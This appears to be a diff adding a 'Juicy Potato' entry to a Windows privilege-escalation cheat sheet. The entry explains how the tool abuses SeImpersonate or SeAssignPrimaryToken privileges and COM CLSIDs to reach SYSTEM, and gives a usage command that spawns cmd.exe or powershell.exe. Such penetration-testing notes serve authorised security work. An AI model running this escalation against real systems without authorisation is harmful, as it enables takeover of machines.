@@ -1055,6 +1055,29 @@ The following tokens can be exploited to gain SYSTEM access privileges:
 - SeTakeOwnershipPrivilege
 - SeDebugPrivilege
 
+###### Juicy Potato
+
+`Juicy Potato` is an improved version of `RottenPotatoNG` that allows for
+privilege escalation to `NT AUTHORITY\SYSTEM` from any account having the
+`SeImpersonate` or `SeAssignPrimaryToken` privileges.
+
+`RottenPotatoNG`, and its variants, leverages a privilege escalation chain
+based on the `BITS` service, while `Juicy Potato` can use the service
+specified as parameter, using its `Class Identifier (CLSID)`.  
+
+A list of services' `CLSID` that can be leveraged for privilege escalation is
+available on the tool GitHub repository:
+`https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md`
+
+```
+Mandatory args:
+-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
+-p <BINARY>: program to launch
+-l <PORT>: COM server listen port
+
+JuicyPotato.exe -t * -c <CLSID> -l <PORT> -p <cmd.exe | powershell.exe | BINARY>
+```
+
 ###### Rotten Potato x64 w/ Metasploit
 
 `RottenPotato` can be used in combination with the `Metasploit` `meterpreter`
